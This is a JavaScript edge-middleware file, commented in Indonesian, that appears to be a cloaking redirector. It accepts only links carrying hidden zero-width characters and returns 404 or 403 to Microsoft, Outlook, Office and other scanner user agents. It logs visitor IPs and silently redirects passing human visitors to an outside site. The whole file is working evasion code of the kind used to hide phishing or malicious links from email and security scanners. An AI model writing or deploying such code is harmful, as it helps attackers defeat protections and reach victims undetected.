export default function middleware(req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  const ip = req.headers.get('x-forwarded-for') || req.ip || 'Unknown IP';
  
  // 1. DETEKSI KUNCI GAIB (ZWC)
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));

  // 2. LOGGING UNTUK AKSES TANPA ZWC (PATH POLOS)
  if (!hasZwc && url.pathname === '/') {
    const isLikelyBot = /bot|spider|crawler|scanner|microsoft|outlook|office/i.test(ua) || ua.length < 30;
    const label = isLikelyBot ? "⚠️ BOT SCANNING (NO ZWC)" : "👤 MANUAL ACCESS (NO ZWC)";
    
    console.log(`${label} | IP: ${ip} | UA: ${ua}`);
    
    // Tetap kasih 404 supaya pintu tetap tertutup
    return new Response('404 Not Found', { status: 404 });
  }

  // 3. FINGERPRINTING MANUSIA (Untuk yang bawa ZWC)
  const hasAcceptLang = req.headers.has('accept-language'); 
  const hasAccept = req.headers.get('accept')?.includes('text/html');
  const isMobile = /iphone|ipad|android/.test(ua);
  const isDesktop = /windows|macintosh|linux/.test(ua) && !/bot|crawler|spider/.test(ua);

  // 4. DAFTAR HITAM BOT
  const hardBotKeywords = ['bot', 'spider', 'crawler', 'scanner', 'outlook', 'office', 'microsoft', 'linkdetect', 'clark', 'cloud'];
  const isHardBot = hardBotKeywords.some(keyword => ua.includes(keyword));

  // 5. LOGIKA EKSEKUSI UNTUK PEMEGANG KUNCI
  if (isHardBot || ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
    console.log(`❌ BLOCKED BOT (WITH ZWC): IP=${ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // 6. SUCCESS REDIRECT
  console.log(`✅ HUMAN SUCCESS: IP=${ip} | URL=${url.pathname}`);
  const targetUrl = 'https://nusaindahrp.com/?dev';
  
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: { 'Content-Type': 'text/html', 'Refresh': `0; url=${targetUrl}` }
    }
  );
}
